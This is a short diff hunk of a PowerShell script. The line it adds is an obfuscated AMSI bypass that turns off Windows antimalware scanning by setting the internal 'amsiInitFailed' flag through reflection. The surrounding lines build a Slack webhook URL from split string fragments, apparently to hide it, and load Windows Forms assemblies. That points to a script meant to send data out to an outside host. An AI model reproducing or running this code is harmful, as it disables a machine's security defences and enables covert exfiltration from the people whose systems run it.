@@ -1,5 +1,5 @@
 
-
+$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
 $uriSlack = "https://h"+"ook"+"s.sla"+"ck"+".com/serv"+"ices/T01Q"+"U9DSY2U/B050"+"L0VV73R/"+"2Xf6XxXxhAXOO"+"zgxxWrz9Tf3"
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName Microsoft.VisualBasic
